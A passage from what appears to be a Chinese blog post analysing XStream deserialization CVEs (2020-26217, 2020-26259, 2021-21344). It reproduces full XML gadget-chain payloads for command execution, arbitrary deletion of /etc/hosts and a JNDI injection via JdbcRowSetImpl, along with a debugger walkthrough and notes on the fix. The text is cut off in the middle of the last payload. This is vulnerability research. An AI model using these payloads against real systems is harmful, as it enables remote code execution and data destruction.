id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>一种黑名单的绕过方式</p><h2 id="PoC-1"><a href="#PoC-1" class="headerlink" title="PoC"></a>PoC</h2><p>来自官网的PoC：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">flags</span>&gt;</span>0<span class="tag">&lt;/<span class="name">flags</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">contentType</span>&gt;</span>text/plain<span class="tag">&lt;/<span class="name">contentType</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">'java.io.SequenceInputStream'</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">e</span> <span class="attr">class</span>=<span class="string">'javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">iterator</span> <span class="attr">class</span>=<span class="string">'javax.imageio.spi.FilterIterator'</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">'java.util.ArrayList$Itr'</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">cursor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">cursor</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">lastRet</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">lastRet</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">expectedModCount</span>&gt;</span>1<span class="tag">&lt;/<span class="name">expectedModCount</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">java.lang.ProcessBuilder</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                                                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>open<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>/Applications/Calculator.app<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;/<span class="name">java.lang.ProcessBuilder</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">iter</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">'javax.imageio.ImageIO$ContainsFilter'</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">method</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">method</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">next</span>/&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">iterator</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">type</span>&gt;</span>KEYS<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">e</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">in</span> <span class="attr">class</span>=<span class="string">'java.io.ByteArrayInputStream'</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">buf</span>&gt;</span><span class="tag">&lt;/<span class="name">buf</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">pos</span>&gt;</span>0<span class="tag">&lt;/<span class="name">pos</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">mark</span>&gt;</span>0<span class="tag">&lt;/<span class="name">mark</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">count</span>&gt;</span>0<span class="tag">&lt;/<span class="name">count</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">in</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>test<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure><p>复现：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210731164706500.png" alt="image-20210731164706500" style="zoom:50%;"><p>调试：</p><p>这次PoC是map结构，其中key为jdk.nashorn.internal.objects.NativeString对象、value值为test的Entry；</p><p>而jdk.nashorn.internal.objects.NativeString对象又存在flags、value属性，它的flags属性值为0、value属性值为com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data；</p><p>前面简单几步直接跳过，不过就是首先还原出来一个hashmap，然后将本地的key，value分别赋值。</p><p>也就是MapConverter这里，target是hashmap实例，我们需要放进去的是key是NativeString，value是test字符串</p><p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210731180419083.png" alt="image-20210731180419083"></p><p>进入put，首先需要计算key的hash值：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210731180636825.png" alt="image-20210731180636825" style="zoom:50%;"><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210731180702829.png" alt="image-20210731180702829" style="zoom:50%;"><p>这里的this就是key，也就是NativeString对象，对应的this.value就是NativeString对象的value属性，也就是payload里面的Base64Data对象：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210731180733336.png" alt="image-20210731180733336" style="zoom:50%;"><p>由于this.value不是String类型的变量，会执行<code>this.value.toString()</code>，继续跟：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210731181123157.png" alt="image-20210731181123157" style="zoom:50%;"><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210731181151939.png" alt="image-20210731181151939" style="zoom:50%;"><p><code>this.get</code>方法也就是Base64Data对象的get方法，如上图，在get方法内部其实本质上是调用了Base64Data对象的dataHandler属性，看PoC，<code>this.dataHandler.getDataSource()</code>返回的是<code>com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource</code></p><p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210731182419927.png" alt="image-20210731182419927"></p><p>这里本质上is就是PoC里面的is属性值，也就是PoC里面的<code>java.io.SequenceInputStream</code></p><p>接下来执行到<code>readFrom</code>方法：</p><p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210731185247655.png" alt="image-20210731185247655"></p><p>进入<code>read</code>方法：</p><p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210731185429795.png" alt="image-20210731185429795"></p><p>进入<code>nextStream</code>方法：</p><p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210731185551586.png" alt="image-20210731185551586"></p><p>这里的in和e在PoC里面都有对应的构造</p><p>接下来会调用<code>e.nextElement()</code>方法</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210731185847554.png" alt="image-20210731185847554" style="zoom:50%;"><p>iterator属性也有对应的PoC构造，也就是<code>java.imageio.spi.FilterIterator</code></p><p>接下来需要执行的是<code>iterator.next().getKey();</code></p><p>先来到<code>next()</code>方法</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210801132432728.png" alt="image-20210801132432728" style="zoom:50%;"><p>会先调用<code>advance()</code>方法：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210801132529807.png" alt="image-20210801132529807" style="zoom:50%;"><p>这里iter属性是<code>java.util.ArrayList$Itr</code>，filter属性是<code>javax.imageio.ImageIO$ContainsFilter</code></p><p>进入<code>filter.filter(elt)</code>方法：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210801132837648.png" alt="image-20210801132837648" style="zoom:50%;"><p>看到这里直接就是对method属性进行了invoke调用，method是我们的start方法，name是start字符串</p><p>elt是什么？elt就是上一步的<code>iter.next()</code>的返回值，是<code>java.lang.ProcessBuilder</code>对象。</p><p>elt为构造好的java.lang.ProcessBuilder对象。在method与elt都可控的情况下，进行反射调用即可实现远程代码执行利用。</p><p>修复：</p><p>在1.4.14中对反射调用时，对class进行了黑名单拦截：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210801134138222.png" alt="image-20210801134138222" style="zoom:50%;"><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210801134206689.png" alt="image-20210801134206689" style="zoom:50%;"><h1 id="CVE-2020-26259"><a href="#CVE-2020-26259" class="headerlink" title="CVE_2020_26259"></a>CVE_2020_26259</h1><p>XStream：1.4.13</p><h2 id="漏洞成因-2"><a href="#漏洞成因-2" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>一种任意文件删除漏洞</p><h2 id="PoC-2"><a href="#PoC-2" class="headerlink" title="PoC"></a>PoC</h2><p>来自官网的PoC：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">flags</span>&gt;</span>0<span class="tag">&lt;/<span class="name">flags</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">contentType</span>&gt;</span>text/plain<span class="tag">&lt;/<span class="name">contentType</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.ws.util.ReadAllStream$FileStream'</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">tempFile</span>&gt;</span>/etc/hosts<span class="tag">&lt;/<span class="name">tempFile</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>test<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure><p>26259和26217很像，前半段都利用了<code>NativeString</code>，<code>Base64Data</code>，<code>XmlDataSource</code></p><p>但是后半段的<code>is</code>属性有区别，是<code>com.sun.xml.internal.ws.util.ReadAllStream$FileStream</code></p><p>调试：</p><p>还是来到get方法：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210801141753861.png" alt="image-20210801141753861" style="zoom:50%;"><p>值得注意的是，这次漏洞利用的不是Base64Data中get方法里的baos.readFrom(is)这个入口，而是位于它下面一行的is.close()这行代码。通过调试，程序在执行过get方法中baos.readFrom(is)后，紧接着执行is.Close()。</p><p>此时的is是<code>com.sun.xml.internal.ws.util.ReadAllStream$FileStream</code>，跟入其中的close方法，见下图：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210801142302517.png" alt="image-20210801142302517" style="zoom:50%;"><p>当这里<code>tempFile</code>属性其实是PoC中可控的：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tempFile</span>&gt;</span>/etc/hosts<span class="tag">&lt;/<span class="name">tempFile</span>&gt;</span></span><br></pre></td></tr></table></figure><p>所以如果这里tempFile字段不为空，则直接删除，存在一个任意文件删除漏洞</p><h1 id="CVE-2021-21344"><a href="#CVE-2021-21344" class="headerlink" title="CVE_2021_21344"></a>CVE_2021_21344</h1><p>XStream：1.4.15</p><h2 id="漏洞成因-3"><a href="#漏洞成因-3" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>RCE，最终漏洞的触发点是JdbcRowSetImpl 是JNDI类型注入漏洞</p><h2 id="PoC-3"><a href="#PoC-3" class="headerlink" title="PoC"></a>PoC</h2><p>来自官网：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">'custom'</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">'sun.awt.datatransfer.DataTransferer$IndexOrderComparator'</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">indexMap</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.ws.client.ResponseContext'</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">packet</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">message</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.ws.message.JAXBAttachment'</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.ws.db.glassfish.BridgeWrapper'</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.bind.v2.runtime.BridgeImpl'</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">bi</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl'</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">jaxbType</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">jaxbType</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">uriProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">attributeProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">inheritedAttWildcard</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection'</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">getter</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">name</span>&gt;</span>getDatabaseMetaData<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">getter</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">inheritedAttWildcard</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">bi</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tagName</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">context</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">marshallerPool</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1'</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">'../..'</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">marshallerPool</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">nameList</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">boolean</span>&gt;</span>true<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">localNames</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">localNames</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">nameList</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">jaxbObject</span> <span class="attr">class</span>=<span class="string">'com.sun.rowset.JdbcRowSetImpl'</span> <span class="attr">serialization</span>=<span class="string">'custom'</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">concurrency</span>&gt;</span>1008<span class="tag">&lt;/<span class="name">concurrency</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">escapeProcessing</span>&gt;</span>true<span class="tag">&lt;/<span class="name">escapeProcessing</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">fetchDir</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">fetchDir</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">fetchSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">fetchSize</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">isolation</span>&gt;</span>2<span class="tag">&lt;/<span class="name">isolation</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">maxFieldSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxFieldSize</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">maxRows</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxRows</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">queryTimeout</span>&gt;</span>0<span class="tag">&lt;/<span class="name">queryTimeout</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">readOnly</span>&gt;</span>true<span class="tag">&lt;/<span class="name">readOnly</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">rowSetType</span>&gt;</span>1004<span class="tag">&lt;/<span class="name">rowSetType</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">showDeleted</span>&gt;</span>false<span class="tag">&lt;/<span class="name">showDeleted</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">dataSource</span>&gt;</span>rmi://localhost:15000/CallRemoteMethod<span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">params</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">iMatchColumns</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span 